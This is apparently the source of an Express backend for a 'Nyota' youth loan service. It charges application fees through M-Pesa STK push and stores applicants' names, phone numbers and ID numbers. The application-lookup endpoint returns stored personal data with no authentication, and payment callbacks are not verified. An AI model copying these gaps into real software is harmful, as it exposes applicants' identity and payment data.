
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// In-memory store (use DB in production)
const applications = new Map();

// M-Pesa Daraja API Configuration (use readable env var names)
const MPESA_CONFIG = {
  consumerKey: process.env.MPESA_CONSUMER_KEY,
  consumerSecret: process.env.MPESA_CONSUMER_SECRET,
  shortCode: process.env.MPESA_SHORTCODE,
  passkey: process.env.MPESA_PASSKEY,
  callbackURL: process.env.MPESA_CALLBACK_URL || 'https://your-domain.com/api/mpesa-callback'
};

// Helper: generate timestamp in YYYYMMDDHHmmss
function generateTimestamp() {
  const d = new Date();
  const YYYY = d.getFullYear().toString();
  const MM = String(d.getMonth() + 1).padStart(2, '0');
  const DD = String(d.getDate()).padStart(2, '0');
  const hh = String(d.getHours()).padStart(2, '0');
  const mm = String(d.getMinutes()).padStart(2, '0');
  const ss = String(d.getSeconds()).padStart(2, '0');
  return `${YYYY}${MM}${DD}${hh}${mm}${ss}`;
}

// Get M-Pesa Access Token with improved error output
async function getAccessToken() {
  try {
    if (!MPESA_CONFIG.consumerKey || !MPESA_CONFIG.consumerSecret) {
      throw new Error('Missing MPESA_CONSUMER_KEY or MPESA_CONSUMER_SECRET in .env');
    }
    const auth = Buffer.from(`${MPESA_CONFIG.consumerKey}:${MPESA_CONFIG.consumerSecret}`).toString('base64');
    const resp = await axios.get(
      'https://sandbox.safaricom.co.ke/oauth/v1/generate?grant_type=client_credentials',
      {
        headers: { Authorization: `Basic ${auth}` }
      }
    );
    return resp.data.access_token;
  } catch (err) {
    // show full response from safaricom if available
    console.error('Error getting access token:', err.response?.data ?? err.message);
    throw err;
  }
}

// Initiate STK Push (M-Pesa Payment)
app.post('/api/initiate-payment', async (req, res) => {
  try {
    const { phoneNumber, amount, accountReference, transactionDesc } = req.body;

    if (!phoneNumber || !amount) {
      return res.status(400).json({ success: false, message: 'phoneNumber and amount are required' });
    }

    // Format phone: 07xxxx -> 2547xxxx
    const formattedPhone = phoneNumber.startsWith('0') ? `254${phoneNumber.substring(1)}` : phoneNumber;

    if (!MPESA_CONFIG.shortCode || !MPESA_CONFIG.passkey || !MPESA_CONFIG.callbackURL) {
      return res.status(500).json({
        success: false,
        message: 'Missing MPESA_SHORTCODE, MPESA_PASSKEY or MPESA_CALLBACK_URL in .env'
      });
    }

    const accessToken = await getAccessToken();

    // Timestamp format: YYYYMMDDHHmmss
    const timestamp = generateTimestamp();

    // Password: base64(ShortCode + Passkey + Timestamp)
    const password = Buffer.from(`${MPESA_CONFIG.shortCode}${MPESA_CONFIG.passkey}${timestamp}`).toString('base64');

    const paymentData = {
      BusinessShortCode: MPESA_CONFIG.shortCode,
      Password: password,
      Timestamp: timestamp,
      TransactionType: 'CustomerPayBillOnline',
      Amount: amount,
      PartyA: formattedPhone,
      PartyB: MPESA_CONFIG.shortCode,
      PhoneNumber: formattedPhone,
      CallBackURL: MPESA_CONFIG.callbackURL,
      AccountReference: accountReference || 'NYOTA Loan',
      TransactionDesc: transactionDesc || 'Loan Application Fee'
    };

    const resp = await axios.post(
      'https://sandbox.safaricom.co.ke/mpesa/stkpush/v1/processrequest',
      paymentData,
      {
        headers: {
          Authorization: `Bearer ${accessToken}`,
          'Content-Type': 'application/json'
        }
      }
    );

    console.log('STK request response:', JSON.stringify(resp.data, null, 2));

    // Save only if CheckoutRequestID exists
    const checkoutRequestID = resp.data?.CheckoutRequestID || resp.data?.checkoutRequestID;
    if (checkoutRequestID) {
      applications.set(checkoutRequestID, {
        phoneNumber: formattedPhone,
        amount,
        status: 'pending',
        timestamp: new Date().toISOString()
      });
    }

    return res.json({ success: true, message: 'STK push request sent', data: resp.data });
  } catch (error) {
    console.error('Payment initiation error:', error.response?.data ?? error.message);
    return res.status(500).json({
      success: false,
      message: 'Failed to initiate payment',
      error: error.response?.data ?? error.message
    });
  }
});

// M-Pesa Callback Endpoint
app.post('/api/mpesa-callback', (req, res) => {
  const callbackData = req.body;
  console.log('M-Pesa Callback Received:', JSON.stringify(callbackData, null, 2));

  try {
    const stkCallback = callbackData?.Body?.stkCallback;
    if (!stkCallback) {
      console.log('No stkCallback object in callback body');
      // respond with success so Safaricom doesn't retry unnecessarily
      return res.json({ ResultCode: 0, ResultDesc: 'No stkCallback - received' });
    }

    if (stkCallback.ResultCode === 0) {
      const checkoutRequestID = stkCallback.CheckoutRequestID;
      if (applications.has(checkoutRequestID)) {
        const application = applications.get(checkoutRequestID);
        application.status = 'completed';
        application.completedAt = new Date().toISOString();
        application.mpesaCallback = stkCallback;
        console.log('Payment completed for:', application);
      } else {
        console.log('Unknown CheckoutRequestID in callback:', checkoutRequestID);
      }
    } else {
      console.log('Payment failed:', stkCallback.ResultDesc);
    }
  } catch (err) {
    console.error('Error processing callback:', err.message);
  }

  // Quick ACK to Safaricom
  res.json({ ResultCode: 0, ResultDesc: 'Success' });
});

// Submit Loan Application
app.post('/api/submit-application', (req, res) => {
  try {
    const applicationData = req.body;
    if (!applicationData.fullName || !applicationData.phoneNumber || !applicationData.idNumber) {
      return res.status(400).json({ success: false, message: 'Missing required fields' });
    }
    const applicationId = 'NYOTA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
    applications.set(applicationId, {
      ...applicationData,
      applicationId,
      status: 'pending',
      submittedAt: new Date().toISOString()
    });
    res.json({ success: true, message: 'Application submitted successfully', applicationId, data: applicationData });
  } catch (error) {
    console.error('Application submission error:', error.message);
    res.status(500).json({ success: false, message: 'Failed to submit application', error: error.message });
  }
});

app.get('/api/application/:id', (req, res) => {
  const applicationId = req.params.id;
  if (applications.has(applicationId)) {
    res.json({ success: true, data: applications.get(applicationId) });
  } else {
    res.status(404).json({ success: false, message: 'Application not found' });
  }
});

app.get('/api/loan-options', (req, res) => {
  const loanOptions = [
    { amount: 5500, fee: 100 },
    { amount: 6800, fee: 130 },
    { amount: 7800, fee: 170 },
    { amount: 9800, fee: 190 },
    { amount: 11200, fee: 230 },
    { amount: 16800, fee: 250 },
    { amount: 21200, fee: 270 },
    { amount: 25600, fee: 400 },
    { amount: 30000, fee: 470 },
    { amount: 35400, fee: 590 },
    { amount: 39800, fee: 730 },
    { amount: 44200, fee: 1010 },
    { amount: 48600, fee: 1600 },
    { amount: 60600, fee: 2050 }
  ];
  res.json({ success: true, data: loanOptions });
});

app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: new Date().toISOString(), service: 'Nyota Youth Empowerment API' });
});

app.listen(PORT, () => {
  console.log(`Nyota Backend Server running on port ${PORT}`);
  console.log(`Health check: http://localhost:${PORT}/health`);
});
